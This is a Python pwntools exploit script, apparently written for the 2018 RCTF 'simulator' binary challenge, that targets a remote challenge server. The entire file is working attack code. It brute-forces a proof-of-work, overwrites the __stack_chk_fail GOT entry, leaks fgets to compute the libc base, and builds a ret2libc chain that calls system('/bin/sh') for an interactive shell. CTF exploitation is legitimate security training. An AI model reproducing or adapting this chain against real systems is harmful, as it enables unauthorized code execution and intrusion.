#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
from pwnlib.util.iters import bruteforce
from hashlib import sha256
import string

context.log_level="debug"
pwn_file="./simulator"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")


if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("simulator.2018.teamrois.cn",3131)
    data=conn.recv(16)
    def solve(prefix):
		return bruteforce(lambda x:sha256(prefix+x).digest().startswith("\x00\x00\x00"),string.letters+string.digits,length=4)
    conn.sendline(solve(data))
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("libc address:0x%x"%libc.address)
    pause()


def convert(dest,value):
	return value,(dest-0x4000004)/8|0x80000000

code="""
li a1,%d
li a2,%d
sw a1,a2
END
"""%convert(elf.got["__stack_chk_fail"],0x804AC57)

conn.send(code)
f={
	0x2c:p32(0),
	0x30:p32(elf.sym["puts"]),
	0x34:p32(0x0804AC58),
	0x38:p32(elf.got["fgets"]),
}

conn.sendlineafter("leave a comment: ",fit(f,filler="\x00"))
tmp_add=u32(conn.recv(4))
libc.address=tmp_add-libc.sym["fgets"]
debug()
conn.sendline("END")
f={
	0x30:p32(libc.sym["system"]),
	0x38:p32(libc.search("/bin/sh").next()),
}
conn.sendlineafter("leave a comment: ",fit(f,filler="\x00"))

conn.interactive()









